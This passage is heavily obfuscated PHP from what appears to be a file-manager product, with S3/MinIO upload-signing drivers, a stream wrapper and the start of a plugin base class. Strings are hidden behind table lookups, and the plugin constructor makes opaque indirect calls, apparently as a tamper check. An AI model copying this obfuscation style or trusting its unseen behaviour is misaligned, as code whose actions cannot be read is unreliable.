(isset($GLOBALS[$ğ¯È²ùÓ[6]][$ğ¯È²ùÓ[92]][$ğ¯È²ùÓ[258]]) && $GLOBALS[$ğ¯È²ùÓ[6]][$ğ¯È²ùÓ[92]][$ğ¯È²ùÓ[258]] == $ğ¯È²ùÓ[231]) { return $this->uploadMultiData($ÙçõÎÏá, $û©òá”¿); } if ($this->signVer == $ğ¯È²ùÓ[250]) { return $this->uploadFormDataV2($ÙçõÎÏá, $û©òá”¿); } return $this->uploadFormDataV4($ÙçõÎÏá, $û©òá”¿); } public function uploadFormDataV2($­â©¿‘, $ƒ±÷ôÛÂ = 3600) { $„§’ƒ´ =& $_SERVER[Î·Ü›öğ]; $ôŒÚ³’É = $this->pathFather($­â©¿‘); $«æ••äò = $this->client->getHttpUploadPostParams($this->bucket, $ôŒÚ³’É, $„§’ƒ´[232], $ƒ±÷ôÛÂ); $İ§ÛİÆÍ = array_merge((array) $«æ••äò, array($„§’ƒ´[259] => $„§’ƒ´[250], $„§’ƒ´[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($İ§ÛİÆÍ[$„§’ƒ´[259]]); } return $İ§ÛİÆÍ; } public function uploadFormDataV4($š©ò’ä, $ÚáÃ…Ú = 3600) { $÷ˆİºŒ =& $_SERVER[Î·Ü›öğ]; $ôË»ç‘‚ = $÷ˆİºŒ[232]; $ãÇ›ê¦ò = $÷ˆİºŒ[260]; $¸Û’Ùºµ = $÷ˆİºŒ[62]; $Ä’•Å¤œ = gmdate($÷ˆİºŒ[261]); $»ßÈÈ× = gmdate($÷ˆİºŒ[262]); $Üù±÷¼· = $÷ˆİºŒ[263]; $‘àø®Ş = $ÚáÃ…Ú . $÷ˆİºŒ[12]; $Ğ‰Ñé¼õ = $÷ˆİºŒ[264]; $şÇÃİø˜ = array($this->accessKey, $»ßÈÈ×, $this->region, $¸Û’Ùºµ, $Üù±÷¼·); $¢ıö›ŠÏ = implode($÷ˆİºŒ[8], $şÇÃİø˜); $§Ñ»±İÑ = array($÷ˆİºŒ[265] => gmdate($÷ˆİºŒ[266], strtotime($÷ˆİºŒ[267])), $÷ˆİºŒ[268] => array(array($÷ˆİºŒ[269] => $this->bucket), array($÷ˆİºŒ[270], $÷ˆİºŒ[271], $÷ˆİºŒ[12]), array($÷ˆİºŒ[270], $÷ˆİºŒ[272], $÷ˆİºŒ[12]), array($÷ˆİºŒ[273] => $Ğ‰Ñé¼õ), array($÷ˆİºŒ[274] => $¢ıö›ŠÏ), array($÷ˆİºŒ[275] => $ãÇ›ê¦ò), array($÷ˆİºŒ[276] => $Ä’•Å¤œ), array($÷ˆİºŒ[277] => $‘àø®Ş))); $¹§Á¢¯É = base64_encode(json_encode($§Ñ»±İÑ)); $úé…È¨ = hash_hmac($÷ˆİºŒ[278], $»ßÈÈ×, $÷ˆİºŒ[279] . $this->secret, !0); $é‘ÖÁ¢· = hash_hmac($÷ˆİºŒ[278], $this->region, $úé…È¨, !0); $½Ùç¹…Š = hash_hmac($÷ˆİºŒ[278], $¸Û’Ùºµ, $é‘ÖÁ¢·, !0); $¶ ©Ä¢¯ = hash_hmac($÷ˆİºŒ[278], $Üù±÷¼·, $½Ùç¹…Š, !0); $“šø±ù… = hash_hmac($÷ˆİºŒ[278], $¹§Á¢¯É, $¶ ©Ä¢¯); $šËï™ö = array($÷ˆİºŒ[249] => $÷ˆİºŒ[12], $÷ˆİºŒ[273] => $Ğ‰Ñé¼õ, $÷ˆİºŒ[280] => $¹§Á¢¯É, $÷ˆİºŒ[274] => $¢ıö›ŠÏ, $÷ˆİºŒ[275] => $ãÇ›ê¦ò, $÷ˆİºŒ[276] => $Ä’•Å¤œ, $÷ˆİºŒ[277] => $‘àø®Ş, $÷ˆİºŒ[281] => $“šø±ù…, $÷ˆİºŒ[259] => $÷ˆİºŒ[250], $÷ˆİºŒ[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($šËï™ö[$÷ˆİºŒ[259]]); } return $šËï™ö; } public function uploadMultiData($„·¿Ø÷, $€¶†É†º = 3600) { $¥Ã¨ÏË =& $_SERVER[Î·Ü›öğ]; $×í£”¼ˆ = $this->signVer == $¥Ã¨ÏË[250] ? gmdate($¥Ã¨ÏË[282]) : gmdate($¥Ã¨ÏË[283]); $—¾˜Ìß˜ = array(); $ÅéÛ¬€£ = $this->client->getUploadId($this->bucket, $„·¿Ø÷, $—¾˜Ìß˜); if (!$ÅéÛ¬€£) { return !1; } $·ò½”úš = array($¥Ã¨ÏË[284] => $ÅéÛ¬€£, $¥Ã¨ÏË[209] => $this->getHost() . $¥Ã¨ÏË[8] . $this->pathEncode($„·¿Ø÷), $¥Ã¨ÏË[285] => $×í£”¼ˆ, $¥Ã¨ÏË[97] => $„·¿Ø÷, $¥Ã¨ÏË[259] => $this->signVer); if ($this->_isClientAsync()) { unset($·ò½”úš[$¥Ã¨ÏË[259]]); } return $·ò½”úš; } public function uploadMultiAuth($ğİ¬Ò››, $£§Úó¢í = array()) { $²ç‘£µ© =& $_SERVER[Î·Ü›öğ]; if ($this->signVer == $²ç‘£µ©[250]) { if (isset($£§Úó¢í[$²ç‘£µ©[286]])) { return $this->uploadPartAuthV2($ğİ¬Ò››, $£§Úó¢í); } return $this->uploadListAuthV2($ğİ¬Ò››, $£§Úó¢í); } if (isset($£§Úó¢í[$²ç‘£µ©[286]])) { return $this->uploadPartAuthV4($ğİ¬Ò››, $£§Úó¢í); } return $this->uploadListAuthV4($ğİ¬Ò››, $£§Úó¢í); } public function uploadPartAuthV2($Äşä½‘†, $×¢™¿ÎÖ = array()) { $„æÉÙœı =& $_SERVER[Î·Ü›öğ]; $éíÛº—Ä = $×¢™¿ÎÖ[$„æÉÙœı[97]]; $†”¹» = gmdate($„æÉÙœı[282]); $ñÓåãğè = array_intersect_key($×¢™¿ÎÖ, array_flip(array($„æÉÙœı[286], $„æÉÙœı[284]))); ksort($ñÓåãğè); $½îšÈ¼ = $ñÓåãğè ? $„æÉÙœı[76] . http_build_query($ñÓåãğè, null, $„æÉÙœı[287], PHP_QUERY_RFC3986) : $„æÉÙœı[12]; $ê¶¿ç®İ = array($„æÉÙœı[256], $„æÉÙœı[12], $„æÉÙœı[123], $„æÉÙœı[12], "\x78\x2d\141\x6d\x7a\x2d\144\141\x74\x65\x3a{$†”¹»}", $„æÉÙœı[8] . $this->bucket . $„æÉÙœı[8] . $this->pathEncode($éíÛº—Ä) . $½îšÈ¼); $´¼ìğºÌ = implode($„æÉÙœı[288], $ê¶¿ç®İ); $ÁãÆò‰ç = $this->client->__getSignature($´¼ìğºÌ); return array($„æÉÙœı[289] => $ÁãÆò‰ç, $„æÉÙœı[285] => $†”¹»); } public function uploadListAuthV2($ÂÕô±ó, $ú€´®šœ = array()) { $€ªı±© =& $_SERVER[Î·Ü›öğ]; $ßŠ§ùÏ¡ = $ú€´®šœ[$€ªı±©[97]]; $´˜ã’äë = $ú€´®šœ[$€ªı±©[284]]; $†Ò¥“Ø² = $this->client->listParts($this->bucket, $ßŠ§ùÏ¡, $´˜ã’äë); if (!$†Ò¥“Ø²) { return !1; } $–‹Úâ¥á = gmdate($€ªı±©[282]); $™ÌŒ¶š¼ = $€ªı±©[290] . $´˜ã’äë; $Şèøİ´º = array($€ªı±©[291], $€ªı±©[12], $€ªı±©[123], $€ªı±©[12], "\x78\x2d\x61\155\172\55\144\x61\164\145\x3a{$–‹Úâ¥á}", $€ªı±©[8] . $this->bucket . $€ªı±©[8] . $this->pathEncode($ßŠ§ùÏ¡) . $™ÌŒ¶š¼); $ü¦©ƒÄ³ = implode($€ªı±©[288], $Şèøİ´º); $ş½ğØ™¸ = $this->client->__getSignature($ü¦©ƒÄ³); return array($€ªı±©[289] => $ş½ğØ™¸, $€ªı±©[285] => $–‹Úâ¥á, $€ªı±©[292] => $†Ò¥“Ø²); } public function uploadPartAuthV4($““üÔ³Ş, $ŠÍçÍ‰Ø = array()) { $Ş²´ôÑ =& $_SERVER[Î·Ü›öğ]; $¯ó¸êÉ = $ŠÍçÍ‰Ø[$Ş²´ôÑ[97]]; $ÊÁƒ®†è = array($Ş²´ôÑ[276] => gmdate($Ş²´ôÑ[283]), $Ş²´ôÑ[293] => _get($ŠÍçÍ‰Ø, $Ş²´ôÑ[294], hash($Ş²´ôÑ[278], $Ş²´ôÑ[12]))); $¬äÎñ›Ğ = explode($Ş²´ôÑ[211], $this->getHost()); $ˆôÆçú = array($Ş²´ôÑ[295] => $¬äÎñ›Ğ[1], $Ş²´ôÑ[296] => $Ş²´ôÑ[12], $Ş²´ôÑ[249] => $Ş²´ôÑ[123], $Ş²´ôÑ[297] => $ŠÍçÍ‰Ø[$Ş²´ôÑ[79]]); $ïâ×²õë = $Ş²´ôÑ[256]; $ƒ•®Ñ± = $Ş²´ôÑ[8] . $this->pathEncode($¯ó¸êÉ); $…Šºß¸í = array_intersect_key($ŠÍçÍ‰Ø, array_flip(array($Ş²´ôÑ[286], $Ş²´ôÑ[284]))); $Õ ÄÈÔ… = $this->client->__getSignatureV4($ÊÁƒ®†è, $ˆôÆçú, $ïâ×²õë, $ƒ•®Ñ±, $…Šºß¸í); return array($Ş²´ôÑ[289] => $Õ ÄÈÔ…, $Ş²´ôÑ[293] => $ÊÁƒ®†è[$Ş²´ôÑ[293]], $Ş²´ôÑ[285] => $ÊÁƒ®†è[$Ş²´ôÑ[276]]); } public function uploadListAuthV4($Û¡´‘¿, $™ú’åØí = array()) { $ˆ¢¾š¬ =& $_SERVER[Î·Ü›öğ]; $šÔÍƒŸ„ = $™ú’åØí[$ˆ¢¾š¬[97]]; $ê¥“ßÊ = $™ú’åØí[$ˆ¢¾š¬[284]]; $Ì°€ş£µ = $this->client->listParts($this->bucket, $šÔÍƒŸ„, $ê¥“ßÊ); if (!$Ì°€ş£µ) { return !1; } $¶å÷’½ = $ˆ¢¾š¬[298]; foreach ($Ì°€ş£µ as $·¯ı¾Æõ) { $¶å÷’½ .= $ˆ¢¾š¬[299] . "\74\x50\x61\162\164\x4e\165\x6d\x62\x65\x72\76{$·¯ı¾Æõ[$ˆ¢¾š¬[300]]}\74\x2f\120\x61\x72\x74\116\x75\155\x62\x65\x72\x3e\12" . "\74\105\124\141\147\x3e{$·¯ı¾Æõ[$ˆ¢¾š¬[301]]}\x3c\57\105\x54\x61\147\x3e\12" . $ˆ¢¾š¬[302]; } $¶å÷’½ .= $ˆ¢¾š¬[303]; $Î»•úöã = array($ˆ¢¾š¬[276] => gmdate($ˆ¢¾š¬[283]), $ˆ¢¾š¬[293] => hash($ˆ¢¾š¬[278], $¶å÷’½)); $ÈÁæ¥£¦ = explode($ˆ¢¾š¬[211], $this->getHost()); $ÍÉª§±ù = array($ˆ¢¾š¬[295] => $ÈÁæ¥£¦[1], $ˆ¢¾š¬[249] => $ˆ¢¾š¬[123], $ˆ¢¾š¬[297] => strlen($¶å÷’½)); $¥›Õß±Í = $ˆ¢¾š¬[291]; $½İÉ¡Şİ = $ˆ¢¾š¬[8] . $this->pathEncode($šÔÍƒŸ„); $ë¬Íƒ»¾ = array($ˆ¢¾š¬[284] => $ê¥“ßÊ); $Ÿ…Ø¼å = $this->client->__getSignatureV4($Î»•úöã, $ÍÉª§±ù, $¥›Õß±Í, $½İÉ¡Şİ, $ë¬Íƒ»¾); return array($ˆ¢¾š¬[289] => $Ÿ…Ø¼å, $ˆ¢¾š¬[293] => $Î»•úöã[$ˆ¢¾š¬[293]], $ˆ¢¾š¬[285] => $Î»•úöã[$ˆ¢¾š¬[276]], $ˆ¢¾š¬[292] => $Ì°€ş£µ); } private function _isClientAsync() { $Û‹¥—’Ş =& $_SERVER[Î·Ü›öğ]; static $ïãæ¡Ò² = null; if ($ïãæ¡Ò² === null) { $ÊáØœ•å = isset($_REQUEST[$Û‹¥—’Ş[304]]) ? json_decode($_REQUEST[$Û‹¥—’Ş[304]], !0) : !1; $ïãæ¡Ò² = $ÊáØœ•å && _get($ÊáØœ•å, $Û‹¥—’Ş[305]) == $Û‹¥—’Ş[306]; } return $ïãæ¡Ò²; } public function getHost() { $áÖˆ¨›² =& $_SERVER[Î·Ü›öğ]; $ƒÁş‡ÍÎ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($áÖˆ¨›²[70], $áÖˆ¨›²[64], $áÖˆ¨›²[69], $áÖˆ¨›²[62]))) { return $ƒÁş‡ÍÎ . $áÖˆ¨›²[8] . $this->bucket; } if ($this->osType == $áÖˆ¨›²[62] && !is_domain($ƒÁş‡ÍÎ)) { return $ƒÁş‡ÍÎ . $áÖˆ¨›²[8] . $this->bucket; } $ƒÁş‡ÍÎ = explode($áÖˆ¨›²[211], $ƒÁş‡ÍÎ); return $ƒÁş‡ÍÎ[0] . $áÖˆ¨›²[211] . $this->bucket . $áÖˆ¨›²[10] . $ƒÁş‡ÍÎ[1]; } public function size($éì½ÜÆ) { $ÌÒÆÕäÅ = $this->objectMeta($éì½ÜÆ); return $ÌÒÆÕäÅ ? $ÌÒÆÕäÅ[$_SERVER[Î·Ü›öğ][79]] : 0; } public function info($í¤ˆÖğ™) { if ($this->isFolder($í¤ˆÖğ™)) { return $this->folderInfo($í¤ˆÖğ™); } else { if ($this->isFile($í¤ˆÖğ™)) { return $this->fileInfo($í¤ˆÖğ™); } } return !1; } public function exist($Ô­“Õ¾) { return $this->isFile($Ô­“Õ¾) || $this->isFolder($Ô­“Õ¾); } public function isFile($úàú˜Ë¬) { return !$this->isFolder($úàú˜Ë¬) && $this->objectMeta($úàú˜Ë¬); } public function isFolder($ÍğÍ¶ÖÓ) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][180], $ÍğÍ¶ÖÓ); } protected function objectMeta($Œ‘õô€‚) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][182], $Œ‘õô€‚); } protected function _objectMeta($§­ÜÃªê) { $ÙâôÕ’ =& $_SERVER[Î·Ü›öğ]; $§­ÜÃªê = rtrim($§­ÜÃªê, $ÙâôÕ’[8]); try { $‹¸â´Ğ = $this->client->getObjectInfo($this->bucket, $§­ÜÃªê); if (!isset($‹¸â´Ğ[$ÙâôÕ’[255]]) && isset($‹¸â´Ğ[$ÙâôÕ’[307]])) { $‹¸â´Ğ[$ÙâôÕ’[255]] = $‹¸â´Ğ[$ÙâôÕ’[307]]; } } catch (Exception $Û¯±ß–±) { $‹¸â´Ğ = !1; } if (!$‹¸â´Ğ) { } return $‹¸â´Ğ; } protected function _isFolder($¬ï‰Í„„) { $¼¸êÕª€ =& $_SERVER[Î·Ü›öğ]; $¬ï‰Í„„ = rtrim($¬ï‰Í„„, $¼¸êÕª€[8]) . $¼¸êÕª€[8]; if ($¬ï‰Í„„ == $¼¸êÕª€[12] || $¬ï‰Í„„ == $¼¸êÕª€[8]) { return !0; } $ó¿Ûá…û = $this->client->getBucket($this->bucket, $¬ï‰Í„„, null, 1); if (empty($ó¿Ûá…û[$¼¸êÕª€[239]])) { return !1; } $·şúâó = $ó¿Ûá…û[$¼¸êÕª€[239]][0][$¼¸êÕª€[32]]; return stripos($·şúâó, $¬ï‰Í„„) === 0 ? !0 : !1; if (substr($·şúâó, -1) == $¼¸êÕª€[8]) { return !0; } if (get_path_this($·şúâó) == get_path_this($¬ï‰Í„„)) { return !1; } return !0; } public function listObject($É•ĞÏ) { return $this->fileList($É•ĞÏ, $_SERVER[Î·Ü›öğ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ù‚‚€·Ú) { $ˆâˆ¥Ê« =& $_SERVER[Î·Ü›öğ]; parent::__construct($ù‚‚€·Ú); $this->setSignVersion($ˆâˆ¥Ê«[250]); if (!$this->region) { $this->region = $ˆâˆ¥Ê«[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $º¥çŞÁ = $this->getBktRegion(); return $this->region == $º¥çŞÁ ? !0 : !1; } public function uploadFormData($ŸÁ¨€ÃÔ, $À‘üÑıÏ = 3600) { $¹î–ãÌ¡ =& $_SERVER[Î·Ü›öğ]; $æ½¥ÃÑ¸ = $¹î–ãÌ¡[232]; $Ï—£´²Û = $¹î–ãÌ¡[260]; $ğìêÊ¬ = $¹î–ãÌ¡[62]; $¸ñ‡’Ÿ = gmdate($¹î–ãÌ¡[261]); $ºå÷·‡“ = gmdate($¹î–ãÌ¡[262]); $ûª®¿Äë = $¹î–ãÌ¡[263]; $Å›îªšì = $À‘üÑıÏ . $¹î–ãÌ¡[12]; $ùÏââ™Í = $¹î–ãÌ¡[264]; $ĞÏóù®ˆ = array($this->accessKey, $ºå÷·‡“, $this->region, $ğìêÊ¬, $ûª®¿Äë); $´¸¬ìè› = implode($¹î–ãÌ¡[8], $ĞÏóù®ˆ); $¥Û‰ÇôØ = array($¹î–ãÌ¡[265] => gmdate($¹î–ãÌ¡[266], strtotime($¹î–ãÌ¡[267])), $¹î–ãÌ¡[268] => array(array($¹î–ãÌ¡[269] => $this->bucket), array($¹î–ãÌ¡[309] => $æ½¥ÃÑ¸), array($¹î–ãÌ¡[270], $¹î–ãÌ¡[271], $¹î–ãÌ¡[12]), array($¹î–ãÌ¡[270], $¹î–ãÌ¡[272], $¹î–ãÌ¡[12]), array($¹î–ãÌ¡[270], $¹î–ãÌ¡[310], $¹î–ãÌ¡[12]), array($¹î–ãÌ¡[273] => $ùÏââ™Í), array($¹î–ãÌ¡[274] => $´¸¬ìè›), array($¹î–ãÌ¡[275] => $Ï—£´²Û), array($¹î–ãÌ¡[276] => $¸ñ‡’Ÿ), array($¹î–ãÌ¡[277] => $Å›îªšì))); $‡ğ²Üó = base64_encode(json_encode($¥Û‰ÇôØ)); $ôÁóâ‚  = hash_hmac($¹î–ãÌ¡[278], $ºå÷·‡“, $¹î–ãÌ¡[279] . $this->secret, !0); $Ú™‡÷½¥ = hash_hmac($¹î–ãÌ¡[278], $this->region, $ôÁóâ‚ , !0); $¥Ûè¯– = hash_hmac($¹î–ãÌ¡[278], $ğìêÊ¬, $Ú™‡÷½¥, !0); $ÄÛ‹Æ£ş = hash_hmac($¹î–ãÌ¡[278], $ûª®¿Äë, $¥Ûè¯–, !0); $´›ú³ = hash_hmac($¹î–ãÌ¡[278], $‡ğ²Üó, $ÄÛ‹Æ£ş); $§¦ø­Ğ = array($¹î–ãÌ¡[249] => $¹î–ãÌ¡[12], $¹î–ãÌ¡[297] => $¹î–ãÌ¡[12], $¹î–ãÌ¡[309] => $æ½¥ÃÑ¸, $¹î–ãÌ¡[273] => $ùÏââ™Í, $¹î–ãÌ¡[280] => $‡ğ²Üó, $¹î–ãÌ¡[311] => $´¸¬ìè›, $¹î–ãÌ¡[312] => $Ï—£´²Û, $¹î–ãÌ¡[313] => $¸ñ‡’Ÿ, $¹î–ãÌ¡[314] => $Å›îªšì, $¹î–ãÌ¡[315] => $´›ú³, $¹î–ãÌ¡[209] => $this->getHost()); return $§¦ø­Ğ; } } goto dõŒğğ„ª; BœØçÜ¤İŞ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Á•°ù¾è, $õƒ¥áèŒ = '') { $this->info = $this->info($Á•°ù¾è); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Î·Ü›öğ][87]]; $this->pathOpen = $Á•°ù¾è; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Á•°ù¾è])) { self::$_chunkBuffer[$Á•°ù¾è] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($üÕşÛ‡) { $ƒô”º‡Ë = $this->fileSubstr($this->pose, $üÕşÛ‡); $this->pose += strlen($ƒô”º‡Ë); return $ƒô”º‡Ë; } public function stream_tell() { return $this->pose; } public function stream_seek($î‘¥úœœ, $Š Œ÷–â) { $æ§™´õ¼ =& $_SERVER[Î·Ü›öğ]; if ($Š Œ÷–â == SEEK_SET) { $this->pose = $î‘¥úœœ; } else { if ($Š Œ÷–â == SEEK_CUR) { $this->pose += $î‘¥úœœ; } else { if ($Š Œ÷–â == SEEK_END) { $this->pose = $this->info[$æ§™´õ¼[79]] + intval($î‘¥úœœ); } } } if ($î‘¥úœœ < 0) { $this->pose = $this->info[$æ§™´õ¼[79]] + $î‘¥úœœ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Î·Ü›öğ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($‡Ú½ˆ‰À, $†é‰ºõ¿) { $ÍÓÑ‰Õª =& $_SERVER[Î·Ü›öğ]; $é‰áÁÍÉ = $this->info($‡Ú½ˆ‰À); return array($ÍÓÑ‰Õª[1437] => 0, $ÍÓÑ‰Õª[1645] => 0, $ÍÓÑ‰Õª[16] => 32768 + 511, $ÍÓÑ‰Õª[1646] => 0, $ÍÓÑ‰Õª[1647] => 0, $ÍÓÑ‰Õª[1648] => 0, $ÍÓÑ‰Õª[1649] => 0, $ÍÓÑ‰Õª[79] => $é‰áÁÍÉ[$ÍÓÑ‰Õª[79]], $ÍÓÑ‰Õª[1650] => $é‰áÁÍÉ[$ÍÓÑ‰Õª[1492]], $ÍÓÑ‰Õª[1607] => $é‰áÁÍÉ[$ÍÓÑ‰Õª[88]], $ÍÓÑ‰Õª[1606] => $é‰áÁÍÉ[$ÍÓÑ‰Õª[234]], $ÍÓÑ‰Õª[1651] => 0, $ÍÓÑ‰Õª[1652] => 0); } static $fileInfo = array(); public function info($ëİÚÊ†ı) { $øŸ¸ Œ¤ = $_SERVER[Î·Ü›öğ][1653]; if (isset(self::$fileInfo[$ëİÚÊ†ı])) { return self::$fileInfo[$ëİÚÊ†ı]; } if (substr($ëİÚÊ†ı, 0, strlen($øŸ¸ Œ¤)) != $øŸ¸ Œ¤) { return !1; } self::$fileInfo[$ëİÚÊ†ı] = IO::info(substr($ëİÚÊ†ı, strlen($øŸ¸ Œ¤))); return self::$fileInfo[$ëİÚÊ†ı]; } public static function read($û•„ÓèÅ, $«½¬‡ø™, $“úãÛôì) { if (!isset(self::$_fopenCache[$û•„ÓèÅ])) { $Â¹›ÛÑ = new StreamWrapperIO(); $Â¹›ÛÑ->stream_open($û•„ÓèÅ); self::$_fopenCache[$û•„ÓèÅ] = $Â¹›ÛÑ; } $Â¹›ÛÑ = self::$_fopenCache[$û•„ÓèÅ]; return $Â¹›ÛÑ->fileSubstr($«½¬‡ø™, $“úãÛôì); } public static function _read($©‚ê÷Ä, $î˜®ÃÃ™, $¥¬ÚÎ¿Ô) { $¡ê¨¦Û³ =& $_SERVER[Î·Ü›öğ]; $è˜æßîõ = fopen($©‚ê÷Ä, $¡ê¨¦Û³[1496]); if (!$è˜æßîõ) { return $¡ê¨¦Û³[12]; } $ô¨½¢¥ = 8192; fseek($è˜æßîõ, $î˜®ÃÃ™, SEEK_SET); $Æ¹çù‰³ = $¡ê¨¦Û³[12]; $Òğ³«ã = 0; while ($Òğ³«ã < $¥¬ÚÎ¿Ô) { $í†äî©¬ = min($ô¨½¢¥, $¥¬ÚÎ¿Ô - $Òğ³«ã); $Æ¹çù‰³ .= fread($è˜æßîõ, $í†äî©¬); $Òğ³«ã += $í†äî©¬; } fclose($è˜æßîõ); return $Æ¹çù‰³; } public function fileSubstr($¤ßë¿Ø, $ã•Æ”‰Ÿ) { $­­ˆàÈñ =& $_SERVER[Î·Ü›öğ]; $™ï–ÔÍ = $this->info[$­­ˆàÈñ[79]]; $öñîĞº  = $¤ßë¿Ø; $ åóÎŠÇ = $ã•Æ”‰Ÿ; if ($¤ßë¿Ø < 0) { $¤ßë¿Ø = $™ï–ÔÍ + $¤ßë¿Ø; } if ($ã•Æ”‰Ÿ === !1) { $ã•Æ”‰Ÿ = $™ï–ÔÍ - $¤ßë¿Ø; } if ($¤ßë¿Ø + $ã•Æ”‰Ÿ > $™ï–ÔÍ) { $ã•Æ”‰Ÿ = $™ï–ÔÍ - $¤ßë¿Ø; } if ($ã•Æ”‰Ÿ <= 0) { return $­­ˆàÈñ[12]; } if ($¤ßë¿Ø < 0 || $¤ßë¿Ø >= $™ï–ÔÍ || $ã•Æ”‰Ÿ <= 0 || $ã•Æ”‰Ÿ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\154\x65\122\145\x61\x64\40\145\x72\162\x6f\x72\41\x20\163\x74\141\162\x74\75{$¤ßë¿Ø}\x3b\154\145\156\x67\x74\150\75{$ã•Æ”‰Ÿ}\x3b\40\x73\151\x7a\145\x3d{$™ï–ÔÍ}\x3b"); } $Ä‰Õ„‰ß = 64 * 1024; $ˆÜ¾ú§ =& self::$_chunkBuffer[$this->path]; if (!$ˆÜ¾ú§) { $ˆÜ¾ú§ = array(); } $İøéğ¢Á = 0; $ïâÄûŸ° = 0; $õ¤âÛ˜ô = $­­ˆàÈñ[12]; foreach ($ˆÜ¾ú§ as $İøéğ¢Á => $õ¤âÛ˜ô) { $İøéğ¢Á = intval($İøéğ¢Á); $ïâÄûŸ° = $İøéğ¢Á + strlen($õ¤âÛ˜ô); if ($¤ßë¿Ø >= $ïâÄûŸ°) { continue; } if ($¤ßë¿Ø >= $İøéğ¢Á && $¤ßë¿Ø + $ã•Æ”‰Ÿ <= $ïâÄûŸ°) { return substr($õ¤âÛ˜ô, $¤ßë¿Ø - $İøéğ¢Á, $ã•Æ”‰Ÿ); } break; } if (count($ˆÜ¾ú§) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($­­ˆàÈñ[1654], $­­ˆàÈñ[1655] . count($ˆÜ¾ú§) . "\73\x73\164\x61\x72\x74\75{$¤ßë¿Ø}\x2c\154\x65\x6e\x67\164\x68\75{$ã•Æ”‰Ÿ}\73\160\157\163\x65\72{$İøéğ¢Á}\x7e{$ïâÄûŸ°}"); throw new Exception($­­ˆàÈñ[1656]); } $…øÌ‚‡ = intval($¤ßë¿Ø / $Ä‰Õ„‰ß) * $Ä‰Õ„‰ß; $ãºéÕÜ = ceil(($¤ßë¿Ø + $ã•Æ”‰Ÿ) / $Ä‰Õ„‰ß) * $Ä‰Õ„‰ß - $…øÌ‚‡; $˜âÒº’ = IO::fileSubstr($this->path, $…øÌ‚‡, $ãºéÕÜ); $ˆÜ¾ú§[$…øÌ‚‡ . $­­ˆàÈñ[12]] = $˜âÒº’; ksort($ˆÜ¾ú§); $£á¤ûÑ = substr($˜âÒº’, $¤ßë¿Ø - $…øÌ‚‡, $ã•Æ”‰Ÿ); return $£á¤ûÑ; } private function log($Ô¤Á¹·Ì, $üÅËäŸÉ) { $»…‹ÙŠ =& $_SERVER[Î·Ü›öğ]; $»‡öê”È = timeFloat() - $this->timeStart; write_log(sprintf($»…‹ÙŠ[1657], $Ô¤Á¹·Ì, $this->info[$»…‹ÙŠ[32]], $»‡öê”È, $üÅËäŸÉ), $»…‹ÙŠ[1294]); } } class Message { function __construct() { } public function send($ÍÓ¾à  = '', $ûËÔĞ¦Œ = array(), $¢ÉóŞ£× = "\x74\145\170\164") { $½ÑÏ¹° =& $_SERVER[Î·Ü›öğ]; $‚ÏÚ“°Ò = array($½ÑÏ¹°[33] => $½ÑÏ¹°[1221], $½ÑÏ¹°[171] => $ÍÓ¾à ); if (in_array($¢ÉóŞ£×, array($½ÑÏ¹°[1221], $½ÑÏ¹°[1658]))) { $‚ÏÚ“°Ò[$½ÑÏ¹°[33]] = $¢ÉóŞ£×; } $ûËÔĞ¦Œ = array($½ÑÏ¹°[591] => isset($ûËÔĞ¦Œ[$½ÑÏ¹°[591]]) ? $ûËÔĞ¦Œ[$½ÑÏ¹°[591]] : $½ÑÏ¹°[12], $½ÑÏ¹°[678] => isset($ûËÔĞ¦Œ[$½ÑÏ¹°[678]]) ? $ûËÔĞ¦Œ[$½ÑÏ¹°[678]] : $½ÑÏ¹°[12]); if (empty($ÍÓ¾à ) || empty($ûËÔĞ¦Œ[$½ÑÏ¹°[591]]) && empty($ûËÔĞ¦Œ[$½ÑÏ¹°[678]])) { return !1; } $Ñ ¨Ä÷Ì = array($½ÑÏ¹°[1587] => $‚ÏÚ“°Ò, $½ÑÏ¹°[1659] => $ûËÔĞ¦Œ); Hook::trigger($½ÑÏ¹°[1660], $Ñ ¨Ä÷Ì); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¥’ª’Êô =& $_SERVER[Î·Ü›öğ]; $ÂĞÅ´â¬ = $_SERVER[$¥’ª’Êô[479]]; $ŠóÄÌ£Ç = $¥’ª’Êô[480]; if ($_SERVER[$¥’ª’Êô[481]] != $ŠóÄÌ£Ç($ÂĞÅ´â¬)) { $òØ§é¹ = $¥’ª’Êô[977]; $‡’ÔØòÍ = $¥’ª’Êô[482]; $ãİ¥Õ‡ù = $_SERVER[$¥’ª’Êô[483]] . $¥’ª’Êô[484]; $úñß¥¿÷ = $‡’ÔØòÍ($ãİ¥Õ‡ù); $ÜÉŞÌà = explode($¥’ª’Êô[288], $úñß¥¿÷); if (count($ÜÉŞÌà) < $¥’ª’Êô[711]) { $ÃíÍëˆ = $¥’ª’Êô[486]; $ÃíÍëˆ(); } $Ù§»øï† = $¥’ª’Êô[978]; $Ù§»øï†($_SERVER[$¥’ª’Êô[979]]); $òØ§é¹ = $¥’ª’Êô[977]; $òØ§é¹(); $ÜèşãÁ = $¥’ª’Êô[980]; $¿ºÓ¾Ê¤ = json_encode($GLOBALS[$¥’ª’Êô[981]]); $ı¢³Á›Ğ = 1; for ($ ıÖÒ = 